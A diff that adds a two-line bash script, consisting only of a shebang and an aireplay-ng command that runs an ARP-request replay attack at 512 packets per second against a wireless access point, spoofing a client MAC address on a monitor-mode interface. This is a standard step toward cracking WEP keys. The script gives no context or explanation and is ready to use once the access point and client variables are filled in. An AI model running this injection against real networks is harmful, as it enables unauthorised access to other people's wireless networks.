@@ -1,0 +1,2 @@
+#!/bin/bash
+aireplay-ng -3 -x 512 -b $AP -h $VM wlan1mon;
